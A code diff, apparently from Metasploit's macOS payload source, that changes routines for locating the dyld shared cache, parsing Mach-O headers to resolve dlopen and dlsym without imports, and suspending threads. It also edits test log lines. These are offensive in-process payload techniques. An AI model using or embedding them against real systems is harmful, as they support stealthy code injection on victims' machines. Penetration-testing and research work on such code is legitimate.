@@ -81,7 +81,6 @@ struct dyld_cache_image_info
 
 long asm_syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6);
 int main(int argc, char** argv);
-void* get_dyld_function(const char* function_symbol);
 void resolve_dyld_symbol(void* base, void** dlopen_pointer, void** dlsym_pointer);
 uint64_t syscall_chmod(uint64_t path, long mode);
 uint64_t syscall_shared_region_check_np();
@@ -129,12 +128,12 @@ void init()
   dlsym_ptr dlsym_func = dlsym_addr;
   void* libsystem = dlopen_func("/usr/lib/libSystem.B.dylib", RTLD_NOW);
   asl_log_func = dlsym_func(libsystem, "asl_log");
+  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!!\n");
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
   asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
-  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
-  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
+  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!!\n");
 
   // Suspend threads
   typedef mach_port_t (*mach_task_self_ptr)();
@@ -258,62 +257,6 @@ int string_compare(const char* s1, const char* s2)
   return (*(unsigned char *) s1) - (*(unsigned char *) s2);
 }
 
-void * get_dyld_function(const char* function_symbol) 
-{
-  uint64_t shared_region_start = syscall_shared_region_check_np();
-
-  struct dyld_cache_header *header = (void*)shared_region_start;
-  struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;
-  struct dyld_cache_image_info *dcimg = (void*)header + header->imagesOffset;
-  uint64_t libdyld_address;
-  for (size_t i=0; i < header->imagesCount; i++) {
-    char * pathFile = (char *)shared_region_start+dcimg->pathFileOffset;
-    if (string_compare(pathFile, "/usr/lib/system/libdyld.dylib") == 0) {
-      libdyld_address = dcimg->address;
-      break;
-    }
-    dcimg++;
-  }
-  void* vm_slide_offset  = (void*)header - sfm->address;
-  libdyld_address = (libdyld_address + vm_slide_offset);
-
-  mach_header_t *mh = (mach_header_t*)libdyld_address;
-  const struct load_command* cmd = (struct load_command*)(((char*)mh)+sizeof(mach_header_t));
-  struct symtab_command* symtab_cmd = 0;
-  segment_command_t* linkedit_cmd = 0;
-  segment_command_t* text_cmd = 0;
-
-  for (uint32_t i = 0; i < mh->ncmds; ++i) {
-    if (cmd->cmd == LC_SEGMENT_T) {
-      segment_command_t* segment_cmd = (struct segment_command_t*)cmd;
-      if (string_compare(segment_cmd->segname, SEG_TEXT) == 0) {
-        text_cmd = segment_cmd;
-      } else if (string_compare(segment_cmd->segname, SEG_LINKEDIT) == 0) {
-        linkedit_cmd = segment_cmd;
-      }
-    }
-    if (cmd->cmd == LC_SYMTAB) {
-      symtab_cmd = (struct symtab_command*)cmd;
-    }
-    cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
-  }
-
-  unsigned int file_slide = ((unsigned long)linkedit_cmd->vmaddr - (unsigned long)text_cmd->vmaddr) - linkedit_cmd->fileoff;
-  nlist_t *sym = (nlist_t*)((unsigned long)mh + (symtab_cmd->symoff + file_slide));
-  char *strings = (char*)((unsigned long)mh + (symtab_cmd->stroff + file_slide));
-
-  for (uint32_t i = 0; i < symtab_cmd->nsyms; ++i) {
-    if (sym->n_un.n_strx) {
-      char * symbol = strings + sym->n_un.n_strx;
-      if (string_compare(symbol, function_symbol) == 0) {
-        return sym->n_value + vm_slide_offset;
-      }
-    }
-    sym += 1;
-  }
-  return 0;
-}
-
 uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer) 
 {
   while(1) {
@@ -343,17 +286,16 @@ void resolve_dyld_symbol(void* base, void** dlopen_pointer, void** dlsym_pointer
   for (int i=0;i<((mach_header_t*)base)->ncmds; i++) {
     if (lc->cmd == LC_SEGMENT_T) {
       sc = (struct segment_command*)lc;
-      switch(*((unsigned int *)&sc->segname[2])) {
-        case 0x41544144:
-          data = (struct segment_command*)lc;
-          break;
+      if (string_compare(sc->segname, "__DATA") == 0) {
+        data = (struct segment_command*)lc;
+        break;
       }
     }
     lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
   }
   data_const = data + 1;
   for (int i=0; i<data->nsects; i++,data_const++) {
-    if (*(uint32_t*)&data_const->sectname[2] == 0x736e6f63) {
+    if (string_compare(data_const->sectname, "__const") == 0) {
       break;
     }
   }
